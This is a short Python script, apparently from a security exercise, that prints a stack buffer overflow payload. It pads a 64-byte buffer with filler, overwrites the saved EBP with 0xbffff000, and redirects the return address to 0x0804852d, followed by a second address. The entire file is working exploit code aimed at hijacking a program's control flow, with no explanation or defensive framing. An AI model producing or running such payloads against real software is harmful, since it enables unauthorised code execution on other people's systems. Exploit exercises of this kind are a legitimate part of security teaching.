#!/usr/bin/python

name =  "Jamie Floyd\x00" # 12 bytes
buf = "A"*(64-12) # fills the rest of 64 byte buffer
buf2 = "B"*12 # fill up space to epb
ebp = "\x00\xf0\xff\xbf" # saved ebp is 0xbffff000
attack = "\x2d\x85\x04\x08" # address I want to ret to: 0804852d
attack2 = "\x80\xa0\x04\x08"
#print name+buf+buf2
print name+buf+buf2+ebp+attack+attack2
